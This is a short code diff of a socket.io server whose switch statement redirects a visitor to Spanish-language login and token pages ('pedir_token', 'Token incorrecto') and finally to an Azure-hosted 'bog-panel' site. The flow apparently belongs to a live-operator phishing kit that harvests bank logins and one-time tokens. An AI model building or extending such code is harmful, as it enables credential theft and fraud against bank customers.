@@ -74,11 +74,11 @@ io.on('connection', (socket) => {
                     redirectUrl = '/index.html?action=pedir_logo';
                     break;
                 case 'error_token':
-                    redirectUrl = '/token.html?action=error_token';
+                    redirectUrl = 'token.html?action=error_token';
                     message = 'Token incorrecto. Por favor intente nuevamente.';
                     break;
                 case 'pedir_token':
-                    redirectUrl = '/token.html?action=pedir_token';
+                    redirectUrl = 'token.html?action=pedir_token';
                     break;
                 case 'finalizar':
                     redirectUrl = 'https://bog-panel-a7g7fqcgftfscrcv.centralus-01.azurewebsites.net/';
